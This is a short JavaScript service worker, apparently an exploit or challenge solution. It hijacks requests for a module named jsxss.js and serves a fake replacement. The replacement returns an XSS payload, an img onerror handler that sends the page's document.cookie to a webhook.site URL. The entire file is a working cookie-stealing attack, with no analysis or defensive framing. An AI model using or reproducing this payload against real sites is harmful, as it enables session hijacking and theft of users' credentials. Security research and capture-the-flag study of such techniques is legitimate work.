self.addEventListener('install', (e) => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));

self.addEventListener('fetch', (event) => {
  const url = event.request.url;
  // Intercept the dynamic ES module import from cs.js
  if (url === 'http://localhost:3000/jsxss.js' || url.endsWith('/jsxss.js')) {
    const fakeModule = `
      export default function(input) {
        return '<img src=x onerror="fetch(\\'https://webhook.site/4a29bed7-e07e-434b-83d9-38ee5cb315a0?c=\\'+encodeURIComponent(document.cookie))">';
      }
    `;
    event.respondWith(
      new Response(fakeModule, {
        headers: { 'Content-Type': 'application/javascript' }
      })
    );
  }
});